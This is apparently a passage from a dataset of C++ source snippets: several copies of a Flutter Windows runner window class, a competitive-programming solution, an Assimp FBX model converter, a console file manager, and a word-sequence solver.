g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <bits/stdc++.h>\n#define int long long\nusing namespace std;\n\nvoid solve()\n{\n\n    int n;\n    int k, x;\n    cin >> n >> k;\n    map<int, int> mp;\n    while (n--)\n    {\n        cin >> x;\n        x %= k;\n        if (x)\n            mp[k - x]++;\n    }\n    map<int, int>::iterator it;\n    int mx = 0;\n    for (it = mp.begin(); it != mp.end(); it++)\n    {\n        int x = (it->second - 1) * k + it->first;\n        mx = max(mx, x);\n    }\n    if (mx)\n    {\n        mx++;\n    }\n    cout << mx << \"\\n\";\n\n    return;\n}\nint32_t main()\n{\n    int t;\n    cin >> t;\n    while (t--)\n    {\n        solve();\n    }\n    return 0;\n}\n\n/*\n#include <bits/stdc++.h>\n#define int long long\nusing namespace std;\nint32_t main() {\n\tint x;\n  cin>>x;\n\twhile(x--){\n\t   int n,k;\n\t   cin>>n>>k;\n\t   vector<int>arr;\n\t   unordered_multiset<int>s1,s2;\n\t   for(int i=0;i<n;i++){\n\t     int x;\n\t     cin>>x;\n\t     int p=((k-x%k)%k);\n\t     if(p!=0)arr.push_back((k-x%k)%k);\n\t     //s1.insert((k-x%k)%k);\n\t     // s2.insert((k-x%k)%k);\n\t     \n\t     \n\t   }\n\t   sort(arr.begin(),arr.end());\n\t   int ans=0;\n\t   int t=0;\n\t   while(arr.size()!=0){\n\t   vector<int>v;\n\t   for(auto x:arr){\n      if(x>t){\n\t       ans+=(x-t);\n\t       t=x+1;\n\t     }\n\t     //else if(t==x){\n\t     //  t=x+1;\n\t       \n\t     //}\n\t     else{\n\t       v.push_back(k+x);\n\t     }\n\t   }\n\t   arr=v;\n\t   \n\t}\n\tcout<<ans<<endl;\n\t\n\n}\nreturn 0;\n}*/\n\n",
    "#include \"pch.h\"\n\n#include \"ModelConverter.h\"\n#include \"Util.h\"\n\nnamespace fq::loader\n{\n\tModelConverter::ModelConverter()\n\t\t: mAiScene(nullptr)\n\t{\n\t\tmImpoter = std::make_unique<Assimp::Importer>();\n\t\tmImpoter->SetPropertyBool(AI_CONFIG_IMPORT_FBX_PRESERVE_PIVOTS, 0);\n\t}\n\n\tModelConverter::~ModelConverter()\n\t{\n\t\tmImpoter->FreeScene();\n\t}\n\n\tbool ModelConverter::ReadFBXFile(const std::string& fileName)\n\t{\n\t\tstd::filesystem::path path = std::filesystem::path(fileName);\n\n\t\tif (!std::filesystem::exists(path))\n\t\t{\n\t\t\treturn false;\n\t\t}\n\n\t\tunsigned int importFlags =\n\t\t\taiProcess_Triangulate |\n\t\t\taiProcess_GenNormals |\n\t\t\taiProcess_GenUVCoords |\n\t\t\taiProcess_CalcTangentSpace |\n\t\t\taiProcess_LimitBoneWeights |\n\t\t\taiProcess_GenBoundingBoxes |\n\t\t\taiProcess_ConvertToLeftHanded;\n\n\t\tmAiScene = mImpoter->ReadFile(path.string(), importFlags);\n\n\t\treturn mAiScene != nullptr;\n\t}\n\n\tfq::common::Model ModelConverter::Convert()\n\t{\n\t\tassert(mAiScene != nullptr);\n\t\tusing namespace std;\n\t\tusing namespace fq::common;\n\n\t\tModel model;\n\t\tmodel.Meshes = convertModel();\n\t\tmodel.Materials = convertMaterial();\n\t\tmodel.Animations = convertAnimation();\n\n\t\treturn model;\n\t}\n\n\tstd::vector<std::pair<fq::common::Node, fq::common::Mesh>> ModelConverter::convertModel()\n\t{\n\t\tusing namespace std;\n\t\tusing namespace fq::common;\n\n\t\tvector<pair<Node, Mesh>> meshData;\n\n\t\tparseNode(mAiScene->mRootNode, &meshData);\n\n\t\tsize_t index = 0;\n\t\tset<string> meshNameSet;\n\n\t\tfor (auto& nodeMeshPair : meshData)\n\t\t{\n\t\t\tstd::string& meshName = nodeMeshPair.second.Name;\n\n\t\t\tauto find = meshNameSet.find(meshName);\n\n\t\t\tif (find != meshNameSet.end())\n\t\t\t{\n\t\t\t\tmeshName += std::to_string(index++);\n\t\t\t}\n\n\t\t\tmeshNameSet.insert(meshName);\n\t\t}\n\n\t\tparseBone(&meshData);\n\n\t\treturn meshData;\n\t}\n\n\tstd::vector<fq::common::Material> ModelConverter::convertMaterial()\n\t{\n\t\tusing namespace std;\n\t\tusing namespace fq::common;\n\n\t\tvector<Material> materials;\n\n\t\tfor (size_t i = 0; i < mAiScene->mNumMaterials; ++i)\n\t\t{\n\t\t\taiMaterial* aiMaterialPtr = mAiScene->mMaterials[i];\n\t\t\tMaterial material;\n\n\t\t\tmaterial.Name = aiMaterialPtr->GetName().C_Str();\n\n\t\t\t// to do : \uae30\ubcf8\uc73c\ub85c \uc124\uc815\ub41c \uac12 \ub370\uc774\ud130 \uac00\uc838\uc624\uae30\n\t\t\tif (aiMaterialPtr->Get(AI_MATKEY_BASE_COLOR, material.MaterialDesc.BaseColor) != AI_SUCCESS);\n\t\t\t{\n\t\t\t\taiMaterialPtr->Get(AI_MATKEY_COLOR_DIFFUSE, material.MaterialDesc.BaseColor);\n\t\t\t}\n\t\t\taiMaterialPtr->Get(AI_MATKEY_METALLIC_FACTOR, material.MaterialDesc.Metalness);\n\t\t\taiMaterialPtr->Get(AI_MATKEY_ROUGHNESS_FACTOR, material.MaterialDesc.Roughness);\n\n\t\t\taiString filePath;\n\t\t\tif (aiMaterialPtr->GetTexture(aiTextureType_BASE_COLOR, 0, &filePath) == AI_SUCCESS)\n\t\t\t{\n\t\t\t\tstd::filesystem::path fileFullPath = Util::ToWide(filePath.C_Str());\n\t\t\t\tmaterial.BaseColorFileName = fileFullPath.filename().wstring();\n\t\t\t}\n\t\t\telse if (aiMaterialPtr->GetTexture(aiTextureType_DIFFUSE, 0, &filePath) == AI_SUCCESS)\n\t\t\t{\n\t\t\t\tstd::filesystem::path fileFullPath = Util::ToWide(filePath.C_Str());\n\t\t\t\tmaterial.BaseColorFileName = fileFullPath.filename().wstring();\n\t\t\t}\n\t\t\tif (aiMaterialPtr->GetTexture(aiTextureType_METALNESS, 0, &filePath) == AI_SUCCESS)\n\t\t\t{\n\t\t\t\tstd::filesystem::path fileFullPath = Util::ToWide(filePath.C_Str());\n\t\t\t\tmaterial.MetalnessFileName = fileFullPath.filename().wstring();\n\t\t\t}\n\t\t\tif (aiMaterialPtr->GetTexture(aiTextureType_SHININESS, 0, &filePath) == AI_SUCCESS)\n\t\t\t{\n\t\t\t\tstd::filesystem::path fileFullPath = Util::ToWide(filePath.C_Str());\n\t\t\t\tmaterial.RoughnessFileName = fileFullPath.filename().wstring();\n\t\t\t}\n\t\t\tif (aiMaterialPtr->GetTexture(aiTextureType_NORMALS, 0, &filePath) == AI_SUCCESS)\n\t\t\t{\n\t\t\t\tstd::filesystem::path fileFullPath = Util::ToWide(filePath.C_Str());\n\t\t\t\tmaterial.NormalFileName = fileFullPath.filename().wstring();\n\t\t\t}\n\t\t\tif (aiMaterialPtr->GetTexture(aiTextureType_EMISSIVE, 0, &filePath) == AI_SUCCESS)\n\t\t\t{\n\t\t\t\tstd::filesystem::path fileFullPath = Util::ToWide(filePath.C_Str());\n\t\t\t\tmaterial.EmissiveFileName = fileFullPath.filename().wstring();\n\t\t\t}\n\t\t\tif (aiMaterialPtr->GetTexture(aiTextureType_OPACITY, 0, &filePath) == AI_SUCCESS)\n\t\t\t{\n\t\t\t\tstd::filesystem::path fileFullPath = Util::ToWide(filePath.C_Str());\n\t\t\t\tmaterial.OpacityFileName = fileFullPath.filename().wstring();\n\t\t\t}\n\n\t\t\tmaterials.push_back(material);\n\t\t}\n\n\t\treturn materials;\n\t}\n\n\tstd::vector<fq::common::AnimationClip> ModelConverter::convertAnimation()\n\t{\n\t\tusing namespace std;\n\t\tusing namespace fq::common;\n\n\t\tvector<AnimationClip> animationClips;\n\t\tanimationClips.reserve(mAiScene->mNumAnimations);\n\n\t\tfor (unsigned int i = 0; i < mAiScene->mNumAnimations; ++i)\n\t\t{\n\t\t\taiAnimation* aiAnimationPtr = mAiScene->mAnimations[i];\n\n\t\t\tAnimationClip animationCilp;\n\t\t\tanimationCilp.Name = aiAnimationPtr->mName.C_Str();\n\t\t\tanimationCilp.FrameCount = (unsigned int)aiAnimationPtr->mDuration;\n\t\t\tanimationCilp.FramePerSecond = 1 / (aiAnimationPtr->mTicksPerSecond);\n\t\t\tanimationCilp.Duration = animationCilp.FrameCount * animationCilp.FramePerSecond;\n\n\t\t\tanimationCilp.NodeClips.reserve(aiAnimationPtr->mNumChannels);\n\n\t\t\tfor (unsigned int j = 0; j < aiAn",
    "#include <iostream>\r\n#include <fstream>\r\n#include <cstdio>\r\n#include <cstring>\r\n#include <windows.h>\r\n#include <direct.h>\r\n\r\nusing namespace std;\r\n\r\n// function to create a new file\r\nvoid create_file() {\r\n    string file_name;\r\n    cout << \"Enter the name of the file to create: \";\r\n    getline(cin, file_name);\r\n    ofstream file(file_name.c_str());\r\n    file.close();\r\n    cout << \"File '\" << file_name << \"' created successfully!\\n\";\r\n}\r\n\r\n// function to read the contents of a file\r\nvoid read_file() {\r\n    string file_name;\r\n    cout << \"Enter the name of the file to read: \";\r\n    getline(cin, file_name);\r\n    ifstream file(file_name.c_str());\r\n    if (file.is_open()) {\r\n        cout << \"Contents of file '\" << file_name << \"':\\n\";\r\n        string line;\r\n        while (getline(file, line)) {\r\n            cout << line << endl;\r\n        }\r\n        file.close();\r\n    } else {\r\n        cout << \"Unable to open file '\" << file_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to write to a file\r\nvoid write_file() {\r\n    string file_name, content;\r\n    cout << \"Enter the name of the file to update: \";\r\n    getline(cin, file_name);\r\n    cout << \"Enter the content to add: \";\r\n    getline(cin, content);\r\n    ofstream file(file_name.c_str(), ios::app);\r\n    if (file.is_open()) {\r\n        file << content << endl;\r\n        file.close();\r\n        cout << \"File '\" << file_name << \"' updated successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to open file '\" << file_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to delete a file\r\nvoid delete_file() {\r\n    string file_name;\r\n    cout << \"Enter the name of the file to delete: \";\r\n    getline(cin, file_name);\r\n    if (remove(file_name.c_str()) == 0) {\r\n        cout << \"File '\" << file_name << \"' deleted successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to delete file '\" << file_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to check if a file exists\r\nbool file_exists(const char* file_name) {\r\n    DWORD file_attr = GetFileAttributesA(file_name);\r\n    return (file_attr != INVALID_FILE_ATTRIBUTES && !(file_attr & FILE_ATTRIBUTE_DIRECTORY));\r\n}\r\n\r\n// function to rename a file\r\nvoid rename_file() {\r\n    string old_name, new_name;\r\n    cout << \"Enter the name of the file to rename: \";\r\n    getline(cin, old_name);\r\n    cout << \"Enter the new name for the file: \";\r\n    getline(cin, new_name);\r\n    if (rename(old_name.c_str(), new_name.c_str()) == 0) {\r\n        cout << \"File '\" << old_name << \"' renamed to '\" << new_name << \"' successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to rename file '\" << old_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to create a new directory\r\nvoid create_directory() {\r\n    string directory_name;\r\n    cout << \"Enter the name of the directory to create: \";\r\n    getline(cin, directory_name);\r\n    if (_mkdir(directory_name.c_str()) == 0) {\r\n        cout << \"Directory '\" << directory_name << \"' created successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to create directory '\" << directory_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to delete a directory\r\nvoid delete_directory() {\r\n    string directory_name;\r\n    cout << \"Enter the name of the directory to delete: \";\r\n    getline(cin, directory_name);\r\n    if (_rmdir(directory_name.c_str()) == 0) {\r\n        cout << \"Directory '\" << directory_name << \"' deleted successfully!\\n\";\r\n    } else {\r\n        cout << \"Unable to delete directory '\" << directory_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// function to list all files in a directory\r\nvoid list_directory() {\r\n    string directory_name;\r\n    cout << \"Enter the name of the directory to list: \";\r\n    getline(cin, directory_name);\r\n    WIN32_FIND_DATAA find_data;\r\n    HANDLE handle = FindFirstFileA((directory_name + \"/*\").c_str(), &find_data);\r\n    if (handle != INVALID_HANDLE_VALUE) {\r\n        cout << \"Files in directory '\" << directory_name << \"':\\n\";\r\n        do {\r\n            if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {\r\n                cout << find_data.cFileName << endl;\r\n            }\r\n        } while (FindNextFileA(handle, &find_data));\r\n        FindClose(handle);\r\n    } else {\r\n        cout << \"Unable to open directory '\" << directory_name << \"'!\\n\";\r\n    }\r\n}\r\n\r\n// main function\r\nint main() {\r\n    int choice;\r\n    do {\r\n        cout << \"File Management System Menu:\\n\";\r\n        cout << \"1. Create a new file\\n\";\r\n        cout << \"2. Read the contents of a file\\n\";\r\n        cout << \"3. Write to a file\\n\";\r\n        cout << \"4. Delete a file\\n\";\r\n        cout << \"5. Rename a file\\n\";\r\n        cout << \"6. Create a new directory\\n\";\r\n        cout << \"7. Delete a directory\\n\";\r\n        cout << \"8. List all files in a directory\\n\";\r\n        cout << \"9. Exit\\n\";\r\n        cout << \"Enter your choice (1-9): \";\r\n        cin >> choice;\r\n        cin.ignore();\r\n        switch (choice) {\r\n            case 1:\r\n                create_file();\r\n                break;\r\n            case 2:\r\n                read_file();\r\n                break;\r\n            case 3:\r\n           ",
    "\n#include <iostream>\n#include <map>\n#include <string>\n#include <vector>\n#include <random>\n#include <set>\n#include <fstream>\n#include <sstream>\n#include <algorithm>\n\nusing namespace std;\n\nstruct Pair {\n\tstring word;\n\tstring previous;\n\tstring next;\n\tint position = 0;\n};\n\nstruct WordSet {\n\tstring word;\n\tvector<string> next;\n\tvector<string> previous;\n\tbool is_unique = false;\n};\n\nvector<string> split(const string& text)\n{\n\tvector<string> output;\n\tstring temp = \"\";\n\n\tfor (char c : text) {\n\t\tif (c == ' ') {\n\t\t\toutput.push_back(temp);\n\t\t\ttemp = \"\";\n\t\t}\n\t\telse {\n\t\t\ttemp += c;\n\t\t}\n\t}\n\n\tif (!temp.empty()) {\n\t\toutput.push_back(temp);\n\t}\n\n\treturn output;\n\n}\n\nvector<Pair> find_seed(const vector<string>& words) {\n\tmap<string, int> word_count;\n\tmap<string, int> word_positions;\n\n\t// Count each word and remember the first position\n\tfor (int i = 0; i < words.size(); i++) {\n\t\tword_count[words[i]]++;\n\t\t// Only record the position the first time the word is encountered\n\t\tif (word_count[words[i]] == 1) {\n\t\t\tword_positions[words[i]] = i;\n\t\t}\n\t}\n\n\tvector<Pair> seed;\n\n\t/* Now add to the seed only those words with a count of 1 */\n\tfor (const auto& wc : word_count) {\n\t\tif (wc.second == 1) {\n\t\t\tseed.push_back({ wc.first, \"\", \"\", word_positions[wc.first]});\n\t\t}\n\t}\n\n\treturn seed;\n}\n\nint get_word_index(const string& word, vector<Pair>& words)\n{\n\tfor (int i = 0; i < words.size(); i++) {\n\t\tif (words[i].word == word) {\n\t\t\treturn i;\n\t\t}\n\t}\n\n\treturn -1;\n\n}\n\nvector<int> get_instances_of_word(string& word, vector<string>& words)\n{\n\tvector<int> output;\n\n\tfor (int i = 0; i < words.size(); i++) {\n\t\tif (words[i] == word) {\n\t\t\toutput.push_back(i);\n\t\t}\n\t}\n\n\treturn output;\n\n}\n\nstd::map<std::string, WordSet> rule_set(vector<string>& words, vector<Pair>& seed) {\n\tstd::map<std::string, WordSet> rules;\n\n\tfor (const auto& word : words) {\n\t\tauto& ws = rules[word]; // This ensures a WordSet is created for each word, even if it's not in the seed.\n\t}\n\n\t// Process seed words\n\tfor (const auto& s : seed) {\n\t\trules[s.word].is_unique = true;\n\t}\n\n\t// Construct rules based on words vector\n\tfor (size_t i = 0; i < words.size(); ++i) {\n\t\tstring& word = words[i];\n\t\tif (i > 0) {\n\t\t\t// Add the previous word if not the first word\n\t\t\trules[word].previous.push_back(words[i - 1]);\n\t\t}\n\t\tif (i < words.size() - 1) {\n\t\t\t// Add the next word if not the last word\n\t\t\trules[word].next.push_back(words[i + 1]);\n\t\t}\n\t}\n\n\t// Remove duplicates from previous and next vectors\n\tfor (auto& rule : rules) {\n\t\tauto& ws = rule.second;\n\t\tstd::sort(ws.previous.begin(), ws.previous.end());\n\t\tws.previous.erase(std::unique(ws.previous.begin(), ws.previous.end()), ws.previous.end());\n\n\t\tstd::sort(ws.next.begin(), ws.next.end());\n\t\tws.next.erase(std::unique(ws.next.begin(), ws.next.end()), ws.next.end());\n\t}\n\n\treturn rules;\n}\n\nvoid initialize_array(std::vector<std::string>& arr, int size) {\n\tarr.resize(size);\n\tfor (int i = 0; i < size; ++i) {\n\t\tarr[i] = \"_____\";\n\t}\n}\n\nbool vec_contains_str(vector<string>& words, string& word)\n{\n\tfor (string s : words) {\n\t\tif (s == word) { return true; }\n\t}\n\treturn false;\n}\n\nint get_combinations(string& left, string& right, std::map<std::string, WordSet>& rule_set)\n{\n\tvector<string> combos;\n\tif (left != \"_____\") {\n\t\tcombos = rule_set[left].next;\n\t}\n\t\n\tif (right != \"_____\") {\n\t\tif (combos.empty()) {\n\t\t\tcombos = rule_set[right].previous;\n\t\t}\n\t\telse {\n\t\t\tfor (string s : rule_set[right].previous) {\n\t\t\t\tif (!vec_contains_str(combos, s)) { combos.push_back(s); }\n\t\t\t}\n\t\t}\n\t}\n\n\treturn (combos.empty() ? INT_MAX : combos.size());\n}\n\n/* \nindex: index is the position in the vector<string> we are trying to solve\nwords: the array we are trying to solve\nrule_set: the rules of given words\n*/\nint number_of_combinations(int index, vector<string>& words, std::map<std::string, WordSet>& rule_set) {\n\tint num_combos = 0;\n\tstring prev_word = \"_____\";\n\tstring next_word = \"_____\";\n\t/* Check if we can get the previous word */\n\tif (index - 1 >= 0) {\n\t\t/* Get all words this word could be */\n\t\tprev_word = words[index - 1];\n\t}\n\n\tif (index + 1 < words.size()) {\n\t\tnext_word = words[index + 1];\n\t}\n\n\treturn get_combinations(prev_word, next_word, rule_set);\n\n}\n\n\nvector<int> all_entropy(vector<string>& words, std::map<std::string, WordSet>& rule_set)\n{\n\tvector<int> output;\n\n\tfor (int i = 0; i < words.size(); i++) {\n\t\toutput.push_back(number_of_combinations(i, words, rule_set));\n\t}\n\n\treturn output;\n}\n\nint find_least_combos(vector<string>& words, std::map<std::string, WordSet>& rule_set)\n{\n\tint lowest_combo = INT_MAX;\n\tint index = -1;\n\n\tfor (int i = 0; i < words.size(); i++) {\n\t\tif (words[i] != \"_____\") {\n\t\t\tcontinue;\n\t\t}\n\n\t\tint value = number_of_combinations(i, words, rule_set);\n\t\tif (value < lowest_combo) {\n\t\t\tlowest_combo = value;\n\t\t\tindex = i;\n\t\t}\n\t}\n\n\treturn index;\n\n}\n\nstring vector_to_string(vector<string>& words)\n{\n\tstring output;\n\n\tfor (string s : words) {\n\t\toutput += s + \" \";\n\t}\n\n\treturn output;\n\n}\n\nvoid fill_least_entropy_position(vector<string>& words, std::map<std::string, WordSet>& rule_set, std:",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the 